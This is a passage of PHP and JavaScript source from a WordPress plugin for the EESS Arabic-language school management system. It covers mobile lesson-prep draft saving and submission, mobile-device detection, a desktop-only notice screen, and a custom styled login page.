                if (currentTeacherData.grade) {
                    document.getElementById('m_grade').value = currentTeacherData.grade;
                }
                if (currentTeacherData.section) {
                    document.getElementById('m_section').value = currentTeacherData.section;
                }

                // Auto-restore LocalStorage draft if available
                eessRestoreMobileDraft(currentTeacherData.teacher_id);

                document.getElementById('m-step-form').style.display = 'block';
                document.getElementById('m-step-form').scrollIntoView({ behavior: 'smooth' });
            }

            function eessSaveMobileDraftAuto() {
                if (!currentTeacherData) return;
                const draft = {
                    title: document.getElementById('m_title').value,
                    subject: document.getElementById('m_subject').value,
                    grade: document.getElementById('m_grade').value,
                    section: document.getElementById('m_section').value,
                    objectives: document.getElementById('m_objectives').value,
                    warmup: document.getElementById('m_warmup').value,
                    activities: document.getElementById('m_activities').value,
                    evaluation: document.getElementById('m_evaluation').value
                };
                try {
                    localStorage.setItem('eess_mobile_draft_' + currentTeacherData.teacher_id, JSON.stringify(draft));
                } catch(e) {}
            }

            function eessRestoreMobileDraft(teacherId) {
                try {
                    const raw = localStorage.getItem('eess_mobile_draft_' + teacherId);
                    if (raw) {
                        const d = JSON.parse(raw);
                        if (d.title && !document.getElementById('m_title').value) document.getElementById('m_title').value = d.title;
                        if (d.grade && !document.getElementById('m_grade').value) document.getElementById('m_grade').value = d.grade;
                        if (d.section && !document.getElementById('m_section').value) document.getElementById('m_section').value = d.section;
                        if (d.objectives) document.getElementById('m_objectives').value = d.objectives;
                        if (d.warmup) document.getElementById('m_warmup').value = d.warmup;
                        if (d.activities) document.getElementById('m_activities').value = d.activities;
                        if (d.evaluation) document.getElementById('m_evaluation').value = d.evaluation;
                    }
                } catch(e) {}
            }

            function eessMobileReopenOwnPrep(prep) {
                if (!prep) return;
                document.getElementById('m_title').value = prep.title || '';
                if (prep.subject) document.getElementById('m_subject').value = prep.subject;
                if (prep.grade_level) document.getElementById('m_grade').value = prep.grade_level;
                if (prep.class_section) document.getElementById('m_section').value = prep.class_section;
                if (prep.lesson_date) document.getElementById('m_date').value = prep.lesson_date;

                try {
                    const parsed = typeof prep.lesson_data === 'string' ? JSON.parse(prep.lesson_data) : prep.lesson_data;
                    if (parsed) {
                        if (parsed.objectives) document.getElementById('m_objectives').value = parsed.objectives;
                        if (parsed.warmup) document.getElementById('m_warmup').value = parsed.warmup;
                        if (parsed.activities) document.getElementById('m_activities').value = parsed.activities;
                        if (parsed.evaluation) document.getElementById('m_evaluation').value = parsed.evaluation;
                    }
                } catch(e) {}

                document.getElementById('m-step-form').style.display = 'block';
                document.getElementById('m-step-form').scrollIntoView({ behavior: 'smooth' });
            }

            // Bind input listeners for auto-saving drafts
            jQuery(document).on('input change', '#eess_mobile_prep_form input, #eess_mobile_prep_form textarea, #eess_mobile_prep_form select', function() {
                eessSaveMobileDraftAuto();
            });

            function eessSubmitMobileLesson(e) {
                e.preventDefault();
                const btn = document.getElementById('m_btn_submit');
                const statusBox = document.getElementById('m_submit_status');

                btn.disabled = true;
                btn.innerText = 'جاري إرسال التحضير...';
                statusBox.style.display = 'none';

                const formData = jQuery('#eess_mobile_prep_form').serialize() + '&action=sm_submit_mobile_lesson';

                jQuery.post('<?php echo $ajax_url; ?>', formData, function(res) {
                    btn.disabled = false;
                    btn.innerText = 'إرسال وتوثيق التحضير';

                    if (res.success) {
                        eessShowMobileToast(res.data.message || 'تم حفظ وإرسال التحضير بنجاح وتوثيقه في حسابك!');
                        document.getElementById('eess_mobile_prep_form').reset();
                        setTimeout(() => {
                            location.reload();
                        }, 1200);
                    } else {
                        statusBox.style.display = 'block';
                        statusBox.style.background = '#fef2f2';
                        statusBox.style.color = '#991b1b';
                        statusBox.style.border = '1px solid #fecaca';
                        statusBox.innerText = res.data || 'حدث خطأ أثناء حفظ التحضير.';
                    }
                });
            }
        </script>
        <?php
        return ob_get_clean();
    }

    public function shortcode_lesson_prep() {
        if (!$this->eess_is_mobile_device()) {
            if (!is_user_logged_in()) {
                wp_safe_redirect(add_query_arg('redirect_to', urlencode(home_url('/lesson-prep')), home_url('/sm-login')));
                exit;
            }
        // Logged in on Desktop: Render normal desktop lesson prep view
        ob_start();
        include SM_PLUGIN_DIR . 'templates/admin-lesson-prep.php';
        return ob_get_clean();
        }

        return $this->eess_render_mobile_lesson_prep();

        $user = wp_get_current_user();
        $roles = (array) $user->roles;
        $is_admin = in_array('administrator', $roles) || current_user_can('manage_options');
        $is_sys_admin = in_array('sm_system_admin', $roles);
        $is_principal = in_array('sm_principal', $roles);
        $is_supervisor = in_array('sm_supervisor', $roles);
        $is_coordinator = in_array('sm_coordinator', $roles);
        $is_teacher = in_array('sm_teacher', $roles);

        ob_start();
        include SM_PLUGIN_DIR . 'templates/admin-lesson-prep.php';
        return ob_get_clean();
    }

    public function eess_is_mobile_device() {
        if (wp_is_mobile()) {
            return true;
        }
        $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower($_SERVER['HTTP_USER_AGENT']) : '';
        if (empty($user_agent)) {
            return false;
        }
        return (bool) preg_match('/(android|bb\d+|meego).+mobile|blackberry|iphone|ipad|ipod|opera mini|iemobile|mobile|palm|phone|pocket|psp|symbian|up\.browser|up\.link|mmp|symbian|smartphone|midp|wap|vodafone|o2|pocket|kindle|silk|mobile)/i', $user_agent);
    }

    public function eess_render_mobile_restriction_screen() {
        return '
        <div class="eess-mobile-blocked-container" style="position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: 999999; background: #0f172a; color: #ffffff; display: flex; align-items: center; justify-content: center; padding: 20px; font-family: \'Cairo\', sans-serif; direction: rtl; text-align: center; box-sizing: border-box;">
            <div style="background: rgba(30, 41, 59, 0.95); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 40px 25px; max-width: 480px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); backdrop-filter: blur(10px);">
                <div style="width: 80px; height: 80px; margin: 0 auto 25px auto; background: rgba(239, 68, 68, 0.15); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid rgba(239, 68, 68, 0.3);">
                    <svg style="width: 42px; height: 42px; fill: none; stroke: #ef4444; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;" viewBox="0 0 24 24">
                        <rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect>
                        <line x1="8" y1="21" x2="16" y2="21"></line>
                        <line x1="12" y1="17" x2="12" y2="21"></line>
                        <line x1="2" y1="2" x2="22" y2="22" stroke="#ef4444" stroke-width="2.5"></line>
                    </svg>
                </div>
                <h2 style="font-size: 22px; font-weight: 800; color: #ffffff; margin: 0 0 15px 0; line-height: 1.4;">النظام متاح عبر أجهزة الكمبيوتر والمكتب فقط</h2>
                <div style="background: rgba(239, 68, 68, 0.1); border-right: 4px solid #ef4444; padding: 15px; border-radius: 8px; margin-bottom: 25px; text-align: right;">
                    <p style="margin: 0; font-size: 14px; color: #fca5a5; font-weight: 700; line-height: 1.6;">
                        This system is available on desktop devices only. Please use a desktop or laptop computer to access the system.
                    </p>
                </div>
                <p style="font-size: 14px; color: #94a3b8; line-height: 1.7; margin-bottom: 30px;">
                    عفواً، تم تقييد الوصول لهذه الصفحة من الهواتف المحمولة لحماية البيانات وضمان تجربة استخدام متكاملة. يُرجى التكرم بفتح النظام باستخدام جهاز كمبيوتر مكتبي (Desktop) أو محمول (Laptop).
                </p>
                <div style="display: flex; flex-direction: column; gap: 12px;">
                    <a href="' . esc_url(home_url('/lesson-prep')) . '" style="background: #2563eb; color: #ffffff; text-decoration: none; padding: 14px; border-radius: 12px; font-weight: 800; font-size: 14px; display: flex; align-items: center; justify-content: center; gap: 8px;">
                        <span>الانتقال لصفحة تحضير الدروس للموبايل</span>
                    </a>
                    <a href="' . esc_url(home_url('/class-attendance')) . '" style="background: rgba(255, 255, 255, 0.08); color: #cbd5e1; text-decoration: none; padding: 12px; border-radius: 12px; font-weight: 700; font-size: 13px; display: flex; align-items: center; justify-content: center; gap: 8px;">
                        <span>الانتقال لرصد الحضور والغياب للموبايل</span>
                    </a>
                </div>
            </div>
        </div>
        <script>
            // Client-side hard safety enforcement
            (function() {
                if (window.innerWidth <= 1024 || /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                    document.body.style.overflow = "hidden";
                }
            })();
        </script>
        ';
    }

    public function shortcode_login() {
        if (is_user_logged_in()) {
            wp_redirect(home_url('/sm-admin'));
            exit;
        }

        if ($this->eess_is_mobile_device()) {
            return $this->eess_render_mobile_lesson_prep();
        }

        $output = '
        <style>
        @import url(\'https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&family=Noto+Kufi+Arabic:wght@300;400;600;700;800&display=swap\');

        .eess-login-page-container {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            width: 100vw;
            height: 100vh;
            z-index: 99999;
            overflow-y: auto;
            background: #ffffff;
            font-family: \'Cairo\', \'Noto Kufi Arabic\', sans-serif !important;
            direction: rtl;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .eess-login-split-layout {
            display: flex;
            width: 100%;
            min-height: 100vh;
            margin: 0;
            padding: 0;
        }

        /* Left Panel (Branding) */
        .eess-login-left-panel {
            width: 50%;
            background-color: #0d0d0d;
            background-image: linear-gradient(135deg, #0d0d0d 0%, #16161a 100%);
            color: #ffffff;
            padding: 40px 60px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            position: relative;
            overflow: hidden;
            box-sizing: border-box;
            direction: ltr !important;
            text-align: left !important;
        }

        /* Modal Overlays and dialogs */
        .eess-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(4px);
            z-index: 100000;
            display: none;
            justify-content: center;
            align-items: center;
            padding: 20px;
            box-sizing: border-box;
        }

        .eess-modal-dialog {
            background: #ffffff;
            border-radius: 12px;
            max-width: 520px;
            width: 100%;
            border: 1px solid #e2e8f0;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
            animation: eessFadeIn 0.3s ease;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            text-align: right;
            box-sizing: border-box;
        }

        @keyframes eessFadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .eess-modal-header {
            padding: 18px 24px;
            border-bottom: 1px solid #f1f5f9;
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #f8fafc;
        }

        .eess-modal-header h3 {
            margin: 0;
            font-size: 1.15rem;
            font-weight: 800;
            color: #0f172a;
        }

        .eess-modal-close {
            background: none;
            border: none;
            font-size: 1.5rem;
            color: #94a3b8;
            cursor: pointer;
            line-height: 1;
            padding: 0;
            margin: 0;
            transition: color 0.15s ease;
        }

        .eess-modal-close:hover {
            color: #475569;
        }

        .eess-modal-body {
            padding: 24px;
            box-sizing: border-box;
        }

        /* Steps progress indicator */
        .eess-step-progress-bar {
            display: flex;
            justify-content: space-between;
            margin-bottom: 25px;
            position: relative;
        }

        .eess-step-progress-bar::before {
            content: \'\';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            height: 3px;
            background: #e2e8f0;
            z-index: 1;
        }

        .eess-step-node {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #ffffff;
            border: 2px solid #cbd5e1;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.85rem;
            font-weight: 800;
            color: #64748b;
            z-index: 2;
            transition: all 0.25s ease;
        }

        .eess-step-node.active {
            border-color: #000000;
            background: #000000;
            color: #ffffff;
            box-shadow: 0 0 0 4px rgba(0, 0, 0, 0.1);
        }

        .eess-step-node.completed {
            border-color: #10b981;
            background: #10b981;
            color: #ffffff;
        }

        .eess-wizard-step {
            display: none;
        }

        .eess-wizard-step.active {
            display: block;
        }

        .eess-modal-msg {
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 15px;
            font-size: 0.85rem;
            font-weight: 600;
            display: none;
        }

        .eess-modal-msg.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fca5a5;
        }

        .eess-modal-msg.success {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #6ee7b7;
        }

        /* Official Website Badge */
        .eess-official-badge-container {
            display: flex;
            justify-content: flex-start;
            margin-bottom: 20px;
        }
        .eess-official-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.06);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 50px;
            padding: 6px 14px;
            color: #e2e8f0;
            text-decoration: none !important;
            font-size: 0.8rem;
            font-weight: 500;
            transition: all 0.2s ease;
        }
        .eess-official-badge:hover {
            background: rgba(255, 255, 255, 0.12);
            color: #ffffff;
            border-color: rgba(255, 255, 255, 0.2);
        }
        .eess-official-badge .badge-icon-globe {
            margin-left: 8px;
            font-size: 0.9rem;
            color: #ef4444;
        }
        .eess-official-badge .badge-text-main {
            opacity: 0.8;
            margin-left: 5px;
        }
        .eess-official-badge .badge-text-domain {
            font-weight: bold;
            color: #ffffff;
            border-bottom: 1px dashed rgba(255, 255, 255, 0.4);
            margin-left: 5px;
        }

        /* Branding Logo */
        .eess-branding-header {
            margin-top: 10px;
            position: relative;
            z-index: 2;
        }
        .eess-branding-logo-box {
            display: flex;
            align-items: center;
            justify-content: flex-start;
            gap: 15px;
        }
        .eess-logo-text-col {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
            text-align: left;
        }
        .eess-logo-title {
            font-size: 2rem;
            font-weight: 800;
            letter-spacing: 1px;
            line-height: 1;
            color: #ffffff;
            font-family: sans-serif;
        }
        .eess-logo-subtitle {
            font-size: 0.75rem;
            opacity: 0.7;
            margin-top: 4px;
            font-family: sans-serif;
            color: #cbd5e1;
        }
        .eess-logo-icon-col {
            background-color: #8b1e1e;
            width: 45px;
            height: 45px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .mortarboard-svg {
            width: 26px;
            height: 26px;
            fill: #ffffff;
        }
        .eess-branding-divider {
            height: 4px;
            width: 60px;
            background-color: #8b1e1e;
            margin-top: 15px;
            margin-left: 0 !important;
            margin-right: auto !important;
        }

        /* Main Headline */
        .eess-main-headline {
            font-size: 2.3rem;
            font-weight: 800;
            line-height: 1.45;
            margin: 40px 0;
            z-index: 2;
            color: #ffffff;
        }
        .underline-red {
            border-bottom: 3px solid #8b1e1e;
            padding-bottom: 2px;
        }

        /* About Box */
        .eess-about-box {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 20px 24px;
            margin-top: auto;
            position: relative;
            z-index: 2;
            direction: rtl !important;
            text-align: right !important;
        }
        .eess-about-title {
            font-size: 0.95rem;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 8px;
        }
        .eess-about-desc {
            font-size: 0.85rem;
            line-height: 1.6;
            color: #cbd5e1;
            margin: 0;
        }
        .eess-about-desc a {
            color: #ffffff;
            font-weight: bold;
            text-decoration: underline;
        }

        /* Giant Watermark */
        .eess-watermark {
            position: absolute;
            bottom: -30px;
            left: -20px;
            font-size: 11rem;
            font-weight: 900;
            font-family: sans-serif;
            color: #ffffff;
            opacity: 0.03;
            pointer-events: none;
            line-height: 1;
            user-select: none;
        }

        /* Right Panel (Form) */
        .eess-login-right-panel {
            width: 50%;
            background: #ffffff;
            padding: 40px 80px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            box-sizing: border-box;
        }
        .eess-login-form-inner {
            max-width: 480px;
            width: 100%;
            margin: 0 auto;
        }

        .eess-login-form-title {
            font-size: 1.9rem;
            font-weight: 800;
            color: #0f172a;
            margin: 0 0 8px 0;
        }
        .eess-login-form-subtitle {
            font-size: 0.88rem;
            color: #64748b;
            margin: 0 0 25px 0;
            font-weight: 400;
        }

        /* Floating label container styling */
        .eess-form-group {
            margin-bottom: 16px;
            position: relative;
        }
        .eess-float-container {
            position: relative;
            width: 100%;
        }
        .eess-float-input {
            width: 100%;
            height: 42px;
            background: #f8fafc;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            padding: 10px 14px;
            font-size: 0.88rem;
            color: #0f172a;
            transition: all 0.2s ease;
            box-sizing: border-box;
        }
        .eess-float-input:focus {
            outline: none;
            border-color: #000000;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.08);
        }
        .eess-float-label {
            position: absolute;
            top: 50%;
            right: 14px;
            transform: translateY(-50%);
            font-size: 0.85rem;
            font-weight: 500;
            color: #64748b;
            pointer-events: none;
            transition: all 0.2s ease;
            background: transparent;
            padding: 0 4px;
        }
        .eess-float-input:focus ~ .eess-float-label,
        .eess-float-input:not(:placeholder-shown) ~ .eess-float-label {
            top: 0;
            transform: translateY(-50%) scale(0.85);
            background: #ffffff;
            color: #0f172a;
            font-weight: 700;
        }

        /* Eye Icon Inside Password Fields */
        .eess-password-wrapper {
            position: relative;
            width: 100%;
        }
        .eess-password-wrapper .eess-float-input {
            padding-left: 40px !important;
        }
        .eess-toggle-eye {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            margin: 0;
            color: #64748b;
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
        }
        .eess-toggle-eye:hover {
            color: #0f172a;
        }
        .eess-toggle-eye svg {
            width: 18px;
            height: 18px;
            fill: currentColor;
        }

        .eess-form-input {
            width: 100%;
            height: 42px;
            background: #f8fafc;
            border: 1px solid #cbd5e1;
            border-radius: 6px;
            padding: 0 14px;
            font-size: 0.9rem;
            color: #0f172a;
            transition: all 0.2s ease;
            box-sizing: border-box;
        }
        .eess-form-input:focus {
            outline: none;
            border-color: #000000;
            background: #ffffff;
            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.08);
        }

        .eess-lost-pwd-link {
            font-size: 0.8rem;
            font-weight: 700;
            color: #8b1e1e !important;
            text-decoration: underline !important;
        }
        .eess-lost-pwd-link:hover {
            color: #b91c1c !important;
        }

        /* Remember me styling */
        .eess-form-row-remember {
            margin: 10px 0 15px 0;
        }
        .eess-remember-checkbox-label {
            display: inline-flex;
            align-items: center;
            cursor: pointer;
            user-select: none;
        }
        .eess-remember-checkbox-label input {
            position: absolute;
            opacity: 0;
            cursor: pointer;
            height: 0;
            width: 0;
        }
        .eess-checkbox-custom {
            height: 18px;
            width: 18px;
            background-color: #f8fafc;
            border: 1px solid #cbd5e1;
            border-radius: 4px;
            margin-left: 8px;
            position: relative;
            transition: all 0.15s ease;
        }
        .eess-remember-checkbox-label:hover input ~ .eess-checkbox-custom {
            border-color: #94a3b8;
        }
        .eess-remember-checkbox-label input:checked ~ .eess-checkbox-custom {
            background-color: #000000;
            border-color: #000000;
        }
        .eess-checkbox-custom:after {
            content: "";
            position: absolute;
            display: none;
        }
        .eess-remember-checkbox-label input:checked ~ .eess-checkbox-custom:after {
            display: block;
        }
        .eess-remember-checkbox-label .eess-checkbox-custom:after {
            left: 6px;
            top: 2px;
            width: 4px;
            height: 9px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        .eess-checkbox-text {
            font-size: 0.85rem;
            font-weight: 600;
            color: #334155;
        }

        /* Main Login Button (Dark Black background) */
        .eess-btn-login {
            width: 100%;
            height: 44px;
            background-color: #000000 !important;
            color: #ffffff !important;
            border: none;
            border-radius: 6px;
            font-size: 0.95rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
        }
        .eess-btn-login:hover {
            background-color: #1e1e1e !important;
            transform: translateY(-1px);
            box-shadow: 0 6px 12px -2px rgba(0, 0, 0, 0.15);
        }

        /* Password Reset Card */
        .eess-reset-pwd-card {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            box-sizing: border-box;
        }
        .eess-reset-card-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 6px;
        }
        .eess-reset-card-icon {
            font-size: 1rem;
            color: #8b1e1e;
        }
        .eess-reset-card-title {
            font-size: 0.88rem;
            font-weight: 700;
            color: #0f172a;
        }
        .eess-reset-card-desc {
            font-size: 0.8rem;
            color: #64748b;
            line-height: 1.5;
            margin: 0 0 12px 0;
        }
        /* Reset Password button - Dark Red background */
        .eess-btn-reset-pwd {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            height: 38px;
            background-color: #8b1e1e !important;
            color: #ffffff !important;
            text-decoration: none !important;
            border-radius: 6px;
            font-size: 0.85rem;
            font-weight: 700;
            transition: all 0.2s ease;
            box-shadow: 0 2px 4px rgba(139, 30, 30, 0.1);
        }
        .eess-btn-reset-pwd:hover {
            background-color: #a82525 !important;
            transform: translateY(-1px);
        }

        /* Error notice */
        .eess-error-notice {
            background: #fff5f5;
            color: #c53030;
            padding: 10px 14px;
            border-radius: 6px;
            border: 1px solid #feb2b2;
            margin-bottom: 15px;
            font-size: 0.85rem;
            font-weight: 600;
        }

        /* Footer elements */
        .eess-login-footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid #f1f5f9;
            font-size: 0.75rem;
            color: #94a3b8;
        }
        .eess-footer-left {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .eess-footer-left .lock-icon {
            font-size: 0.85rem;
        }

        /* Responsive Styles */
        @media (max-width: 1024px) {
            .eess-login-left-panel {
                width: 40%;
                padding: 30px 40px;
            }
            .eess-login-right-panel {
                width: 60%;
                padding: 30px 50px;
            }
            .eess-main-headline {
                font-size: 1.8rem;
            }
        }

        @media (max-width: 768px) {
            .eess-login-split-layout {
                flex-direction: column;
            }
            .eess-login-left-panel {
                width: 100%;
                min-height: auto;
                padding: 30px 24px;
            }
            .eess-login-right-panel {
                width: 100%;
                min-height: auto;
                padding: 40px 24px;
            }
            .eess-main-headline {
                font-size: 1.6rem;
                margin: 20px 0;
            }
            .eess-about-box {
                margin-top: 20px;
            }
            .eess-watermark {
                display: none;
            }
        }
        .eess-modal-overlay, .eess-modal-overlay * {
            font-family: \'Cairo\', \'Noto Kufi Arabic\', sans-serif !important;
        }
        </style>

        <div class="eess-login-page-container">
            <div class="eess-login-split-layout">
                <!-- Right Side (Form - Light) -->
                <div class="eess-login-right-panel">
                    <div class="eess-login-form-inner">
                        <!-- Title & Subtitle -->
                        <h1 class="eess-login-form-title">تسجيل الدخول</h1>
                        <p class="eess-login-form-subtitle">أدخل بيانات الاعتماد الخاصة بك للوصول إلى لوحة التحكم.</p>

                        <!-- Error notice if failed -->
                        ';
                        if (isset($_GET['login']) && $_GET['login'] == 'failed') {
                            $output .= '<div class="eess-error-notice">خطأ في اسم المستخدم أو كلمة المرور. يرجى التحقق وإعادة المحاولة.</div>';
                        }
                        $output .= '

                        <!-- Custom login form with Floating Labels -->
                        <form name="loginform" id="sm_login_form" action="' . esc_url(site_url('wp-login.php', 'login_post')) . '" method="post">
                            <!-- Email / Acad ID field -->
                            <div class="eess-form-group">
                                <div class="eess-float-container">
                                    <input type="text" name="log" id="user_login" class="eess-float-input" placeholder=" " required>
                                    <label for="user_login" class="eess-float-label">البريد الإلكتروني / الرقم الأكاديمي *</label>
                                </div>
                            </div>

                            <!-- Password field with Eye Toggle -->
                            <div class="eess-form-group">
                                <div class="eess-float-container eess-password-wrapper">
                                    <input type="password" name="pwd" id="user_pass" class="eess-float-input" placeholder=" " required>
                                    <label for="user_pass" class="eess-float-label">كلمة المرور *</label>
                                    <button type="button" class="eess-toggle-eye" onclick="eessTogglePassVisibility(\'user_pass\', this)" title="إظهار / إخفاء كلمة المرور">
                                        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                                    </button>
                                </div>
                            </div>

                            <!-- Remember me row (compact) -->
                            <div class="eess-form-row-remember" style="margin: 8px 0 15px 0;">
                                <label class="eess-remember-checkbox-label" style="font-size: 0.8rem;">
                                    <input type="checkbox" name="rememberme" id="rememberme" value="forever">
                                    <span class="eess-checkbox-custom" style="height:16px; width:16px;"></span>
                                    <span class="eess-checkbox-text" style="font-size: 0.8rem; color: #64748b;">تذكر بياناتي على هذا الجهاز</span>
                                </label>
                            </div>

                            <!-- Login Submit Button (Compact, aligned right) -->
                            <div class="eess-form-group" style="display: flex; justify-content: flex-end; margin-top: 15px;">
                                <button type="submit" name="wp-submit" id="wp-submit" class="eess-btn-login" style="width: auto; min-width: 140px; height: 38px; padding: 0 20px; font-size: 0.88rem;">
                                    <span>دخول النظام</span>
                                    <span style="margin-right: 6px;">←</span>
                                </button>
                            </div>

                            <input type="hidden" name="redirect_to" value="' . esc_url(isset($_GET['redirect_to']) ? $_GET['redirect_to'] : home_url('/sm-admin')) . '">
                        </form>

                        <!-- Unified Helper Services Card -->
                        <div class="eess-reset-pwd-card" style="margin-top: 15px; border-color: #cbd5e1;">
                            <div class="eess-reset-card-header" style="margin-bottom: 10px;">
                                <span class="eess-reset-card-icon">⚙️</span>
                                <span class="eess-reset-card-title">إدارة الحساب والخدمات المساندة</span>
                            </div>
                            <p class="eess-reset-card-desc" style="margin-bottom: 12px; font-size: 12px; color: #64748b;">أختر إحدى الخدمات التالية لاستعادة كلمة المرور أو البدء في تسجيل حساب جديد بالمنصة:</p>
                            <div style="display: flex; gap: 10px;">
                                <button type="button" onclick="eessOpenForgotModal()" class="eess-btn-reset-pwd" style="flex: 1; font-size: 11px; height: 36px; background-color: #8b1e1e !important;">
                                    استعادة كلمة المرور
                                </button>
                                <button type="button" onclick="eessOpenRegisterModal()" class="eess-btn-reset-pwd" style="flex: 1; font-size: 11px; height: 36px; background-color: #000000 !important;">
                                    تسجيل حساب جديد
                                </button>
                            </div>
                        </div>

                        <!-- Footer under right panel -->
                        <div class="eess-login-footer">
                            <div class="eess-footer-left">
                                <span class="lock-icon">🔒</span>
                                <span>دخول مشفر bit-256</span>
                                <span style="margin: 0 6px; color: #cbd5e1;">|</span>
                                <a href="javascript:void(0)" onclick="eessOpenSupportModal()" style="color: #8b1e1e !important; text-decoration: underline !important; font-weight: bold; cursor: pointer;">المساعدة والدعم الفني</a>
                            </div>
                            <div class="eess-footer-right">
                                <span>© 2026 EESS. جميع الحقوق محفوظة</span>
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Left Side (Branding - Dark) -->
                <div class="eess-login-left-panel">
                    <!-- Official website link badge -->
                    <div class="eess-official-badge-container">
                        <a href="https://eess.online" target="_blank" class="eess-official-badge">
                            <span class="badge-icon-globe">
                                <svg style="width: 14px; height: 14px; fill: currentColor; margin-left: 6px; display: inline-block; vertical-align: middle;" viewBox="0 0 24 24">
                                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.53c-.26-.81-1-1.4-1.9-1.4h-1v-3c0-.55-.45-1-1-1h-6v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.4z"/>
                                </svg>
                            </span>
                            <span class="badge-text-main">الموقع الرسمي للنظام:</span>
                            <span class="badge-text-domain">eess.online</span>
                            <span class="badge-icon-link">
                                <svg style="width: 12px; height: 12px; fill: currentColor; margin-right: 6px; display: inline-block; vertical-align: middle;" viewBox="0 0 24 24">
                                    <path d="M19 19H5V5h7V3H5c-1.11 0-2 .9-2 2v14c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2v-7h-2v7zM14 3v2h3.59l-9.83 9.83 1.41 1.41L19 6.41V10h2V3h-7z"/>
                                </svg>
                            </span>
                        </a>
                    </div>

                    <!-- Branding logo/icon/text -->
                    <div class="eess-branding-header">
                        <div class="eess-branding-logo-box">
                            <div class="eess-logo-icon-col">
                                <svg class="mortarboard-svg" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/>
                                    <path d="M5 13.18v4c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2v-4l-7 3.82-7-3.82z"/>
                                </svg>
                            </div>
                            <div class="eess-logo-text-col">
                                <span class="eess-logo-title">EESS</span>
                                <span class="eess-logo-subtitle">Educational Electronic Systems Services</span>
                            </div>
                        </div>
                        <div class="eess-branding-divider"></div>
                    </div>

                    <!-- Big Title -->
                    <div class="eess-main-headline">
                        منظومة الخدمات <span class="underline-red">التعليمية</span><br>وإدارة الأنظمة <span class="underline-red">الإلكترونية</span>
                    </div>

                    <!-- About EESS box -->
                    <div class="eess-about-box">
                        <div class="eess-about-title">نبذة عن نظام EESS:</div>
                        <p class="eess-about-desc">
                            منظومة EESS هي البوابة الإلكترونية الموحدة لإدارة المناهج والخدمات التعليمية والأكاديمية، تهدف إلى توفير بيئة رقمية آمنة وموثوقة للوصول المباشر لكافة الأنظمة والأدوات المتاحة عبر الموقع الرسمي <a href="https://eess.online" target="_blank">eess.online</a>.
                        </p>
                    </div>

                    <!-- Huge Watermark EESS -->
                    <div class="eess-watermark">EESS</div>
                </div>
            </div>
